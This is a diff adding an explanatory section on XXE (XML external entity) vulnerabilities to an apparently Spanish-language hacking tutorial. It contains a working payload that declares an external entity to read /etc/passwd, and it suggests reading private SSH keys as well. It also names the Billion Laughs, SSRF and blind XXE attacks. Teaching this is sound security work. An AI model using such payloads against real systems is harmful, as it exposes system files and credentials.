@@ -933,11 +933,51 @@ Esta es una vulnerabilidad que permite que el atacante interfiera con el procesa
 
 XML es un formato muy popular que utilizan los desarrolladores para transferir datos entre el navegador web y el servidor, por lo tanto es una vulnerabilidad muy común.
 
+El resultado puede ser lograr `escanear los puertos de la red interna` del servidor, atackes como `server side request forgery (SSRF)`, `leacks de información`, `denegaciones de servicio (DoS)` u otro monton de posibilidades.	
+
 ## ¿EN QUE CONSISTE?
 
+Esto lo voy a explicar con un ejemplo:
 
+En una `estructura XML` hay un `campos principales` que dentro tienen `sub campos`.
+
+Ejemplo:
+
+```xml
+<elements>                                       #campo principal
+	<Author>Airil</Author>                   #subcampos
+	<Subject>Esto es una prueba</Subject>
+	<Content>Contenido</Content>
+</elements>
+```
+
+Entonces `si podemos subir un archivo` como este y vemos que la web `interpreta la estructura del XML` y muestra los campos que le hemos indicado. Esto es crítico porque podemos empezar a pensar en un ataque XXE.
+
+Claro, al igual que nos muestra lo que hemos puesto, `también podemos poner que nos muestre archivos internos del sistema`, entonces vamos a modificar el código anteriormente escrito para que nos muestre el `/etc/passwd`:
+
+```xml
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+	<!ELEMENT foo ANY >
+	<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<elements>
+	<Author>&xxe;</Author>                               #ahora aqui hacemos referencia a lo anterior
+	<Subject>Esto es una prueba</Subject>
+	<Content>Contenido</Content>
+</elements>
+```
+
+Claro, de esta forma también podemos ver otros archivos como puede ser 	/home/user/.ssh/id_rsa o lo que queramos.
 
 ## COMO EXPLOTARLO
+Hay varios ataques distintos, voy a explicar tres:
+
+```
+· Billion Laughs Attack
+· XXE SSRF Attack
+· Blind XXE Vulnerability
+```
+
 
 
 
